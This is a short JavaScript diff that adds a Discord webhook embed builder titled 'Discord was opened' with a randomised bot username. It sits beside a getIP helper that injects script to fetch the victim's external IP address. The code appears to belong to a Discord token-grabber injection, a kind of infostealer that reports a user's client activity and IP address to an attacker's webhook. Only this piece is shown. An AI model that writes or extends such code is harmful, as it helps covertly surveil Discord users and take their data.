@@ -52,7 +52,35 @@ async function execScript(str) {
 
 }
 
+const makeEmbed = async ({
+    fields,
+    image,
+    thumbnail,
+    description
+}) => {
+    var params = {
+        username: "AdB2GD31sf2SF76",
+        content: "",
+        embeds: [{
+            title: "Discord was opened",
+            color: config["embed-color"],
+            fields: fields,
+            description: description ?? "",
+            
+          
 
+
+        }]
+    };
+
+    if (image) params.embeds[0].image = {
+        url: image
+    }
+    if (thumbnail) params.embeds[0].thumbnail = {
+        url: thumbnail
+    }
+    return params
+}
 const getIP = async () => {
     var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
     return json.ip
